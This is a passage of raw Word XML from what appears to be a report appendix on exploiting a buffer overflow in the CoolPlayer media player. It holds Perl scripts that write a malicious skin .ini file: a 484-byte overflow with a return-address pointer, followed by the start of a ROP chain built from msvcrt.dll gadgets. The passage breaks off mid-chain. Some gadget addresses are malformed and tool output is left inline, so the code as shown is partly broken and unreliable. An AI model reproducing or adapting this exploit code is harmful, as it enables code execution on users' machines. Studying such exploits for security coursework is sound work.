                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>=";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="076A1458" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="0B9B1F22" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "A" x 484;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="59060071" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$buffer .= pack('V', 0x77c1128a); </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t>#POINTER TO RETN MEMORY LOCATION</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="564BC584" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "BBBB";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="33E54A52" w14:textId="3DD3E77F" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>CCCC</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7E60FECE" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "DDDD";</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6A1C2EED" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>open($FILE,"&gt;$file1");</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5641314F" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>print $FILE $buffer;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="19A05383" w14:textId="1E0D7D2A" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>close($FILE);</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F439901" w14:textId="0D9AE174" w:rsidR="007C5D85" w:rsidRDefault="007C5D85" w:rsidP="007C5D85">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D5F6664" w14:textId="093C5033" w:rsidR="007C5D85" w:rsidRDefault="007C5D85" w:rsidP="007C5D85">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="112E5482" w14:textId="1A387C7D" w:rsidR="007C5D85" w:rsidRPr="007C5D85" w:rsidRDefault="007C5D85" w:rsidP="007C5D85">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26B86839" w14:textId="77777777" w:rsidR="007C5D85" w:rsidRDefault="007C5D85" w:rsidP="007C5D85">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12695AE5" w14:textId="77777777" w:rsidR="007C5D85" w:rsidRDefault="007C5D85" w:rsidP="007C5D85">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1923EC83" w14:textId="0B832774" w:rsidR="00BA18EC" w:rsidRPr="00BA18EC" w:rsidRDefault="00BA18EC" w:rsidP="007C5D85">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="69" w:name="_Toc103326495"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>B9 - Final ROP crash file (ropcrash2.pl)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="69"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9350"/>
      </w:tblGrid>
      <w:tr w:rsidR="00734785" w14:paraId="470B5B29" w14:textId="77777777" w:rsidTr="00734785">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="61F4F4FF" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$file1= "ropcrash.ini";</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D67BF45" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>nPlaylistSkin</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>=";</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60216B5E" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7D20E2EA" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= "A" x 484;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71AE2F2E" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V', 0x77c1128a); </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t>#POINTER TO RETN MEMORY LOCATION</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4254E16F" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= "BBBB";</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34AD54DB" w14:textId="4C66A83A" w:rsidR="007E747F" w:rsidRDefault="007E747F" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1950928A" w14:textId="3F79FA5F" w:rsidR="007E747F" w:rsidRPr="00734785" w:rsidRDefault="007E747F" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>#ROP Chain</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74A7BE45" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= pack('V',--</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>INFO:gadgets_to_set_ebp</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="623B503B" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c489e8);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># POP EBP # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1881C852" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c489e8);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># skip 4 bytes [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45EE9FF2" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= pack('V',--</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>INFO:gadgets_to_set_ebx</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E7ADC8E" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c4fa1c);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># POP EBX # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A6C2506" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= pack('V',</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>fffffff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">);  </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21D557AF" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c127e1);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># INC EBX # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10919BD6" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c127e1);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># INC EBX # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D140A41" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= pack('V',--</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>INFO:gadgets_to_set_edx</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44DA2B37" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c5289b);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># POP EAX # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00B8C163" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',cfe1467);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t xml:space="preserve"># put delta into </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>eax</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (-&gt; put 0x00001000 into </w:t>
            </w:r>
